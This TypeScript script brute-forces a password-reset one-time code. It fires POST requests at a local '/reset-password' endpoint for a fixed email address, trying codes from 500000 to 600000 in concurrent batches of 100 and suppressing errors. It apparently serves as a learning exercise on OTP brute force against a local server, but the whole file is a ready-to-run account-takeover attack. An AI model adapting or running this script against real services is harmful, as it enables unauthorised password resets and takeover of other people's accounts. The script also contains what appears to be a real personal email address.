import axios from "axios"






async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "vedantj76@gmail.com",
        "otp": otp,

    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: {
            'Content-Type': 'application/json'
        },
        data: data
    };

    try {
        await axios.request(config)
    } catch (error) {
        // console.log(error)
    }




}

//batching and awaiting promise on all 100 req rather than awaiting single one

async function main() {
    for (let i = 500000; i <= 600000; i += 100) {

        const p = [];
        console.log(i)

        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }

        await Promise.all(p);

    }

}

main()



